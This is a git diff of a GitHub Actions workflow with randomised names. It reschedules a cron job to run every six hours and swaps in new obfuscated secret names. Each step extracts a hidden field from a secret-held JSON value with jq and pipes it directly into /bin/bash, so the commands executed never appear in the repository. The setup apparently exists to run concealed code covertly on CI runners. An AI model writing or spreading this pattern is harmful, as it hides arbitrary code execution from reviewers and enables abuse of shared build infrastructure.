@@ -2,23 +2,19 @@ name: wangniman6758
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
+    - cron: '29 4/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangniman6758
         env:
-          vzi43246: ${{ secrets.vzi43246 }}
+          phafk196: ${{ secrets.phafk196 }}
         run: |
-          echo $vzi43246 | jq -r .px19 | /bin/bash
-          echo $nn35 | jq -r .tgbqw0 | /bin/bash
-          echo $xop96256 | jq -r .sf10936 | /bin/bash
-          echo $sc612 | jq -r .zhyok43864 | /bin/bash
-          echo $wis02 | jq -r .ii041 | /bin/bash
-          echo $sxkr196 | jq -r .gc80 | /bin/bash
-          echo $e57 | jq -r .ggc779 | /bin/bash
+          echo $phafk196 | jq -r .cpn126 | /bin/bash
+          echo $gwqcz5002 | jq -r .jyoy81425 | /bin/bash
+          echo $v91522 | jq -r .zc28600 | /bin/bash
+          echo $xbo4 | jq -r .ve31949 | /bin/bash
 
